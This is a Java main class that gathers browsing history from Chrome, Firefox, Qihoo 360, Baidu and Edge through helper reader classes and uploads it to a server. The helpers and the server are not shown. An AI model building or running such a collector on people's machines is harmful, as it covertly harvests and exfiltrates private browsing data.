package org.kamuyashiro;

import org.kamuyashiro.Browser.*;

import java.util.List;

public class BrowserHistoryUploader {

   public static void main(String[] args) {
      // 获取各个浏览器的历史记录

      List<String> chromeHistory = ChromeBrowserHistoryReader.getHistory();
      List<String> firefoxHistory = FirefoxBrowserHistoryReader.getHistory();
      List<String> qihooHistory = QihooBrowserHistoryReader.getHistory();
      List<String> baiduHistory = BaiduBrowserHistoryReader.getHistory();
      List<String> edgeHistory = EdgeBrowserHistoryReader.getHistory();


      // 将历史记录上传到服务器
      HistoryUploader.upload(chromeHistory, firefoxHistory, qihooHistory, baiduHistory,edgeHistory);
   }
}
